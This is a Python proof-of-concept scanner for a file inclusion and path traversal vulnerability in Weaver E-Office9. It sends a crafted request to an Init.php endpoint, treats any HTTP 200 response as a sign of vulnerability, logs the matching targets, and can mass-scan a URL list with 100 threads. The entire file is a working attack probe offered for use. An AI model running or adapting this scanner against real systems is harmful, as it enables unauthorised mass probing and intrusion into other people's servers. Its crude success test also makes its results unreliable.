import requests, sys, re, argparse, time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

            ███████╗     ██████╗ ███████╗███████╗██╗ ██████╗███████╗ █████╗ 
            ██╔════╝    ██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝██╔══██╗
            █████╗█████╗██║   ██║█████╗  █████╗  ██║██║     █████╗  ╚██████║
            ██╔══╝╚════╝██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝   ╚═══██║
            ███████╗    ╚██████╔╝██║     ██║     ██║╚██████╗███████╗ █████╔╝
            ╚══════╝     ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝ ╚════╝ 
                                                                                author:秋妤
                                                                                date:2024.09.22
                                                                                version:1.0
"""

    print(test)


def poc(target):
    url_payload = '/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls'

    try:
        res1 = requests.get(url=target + url_payload, timeout=10)
        if res1.status_code == 200:
            print(f"[+]{target} 存在漏洞！")
            with open('泛微_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description="这是一个关于泛微 Weaver E-Office9 前台文件包含漏洞的脚本")
    parser.add_argument("-u", "--url", dest="url", help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()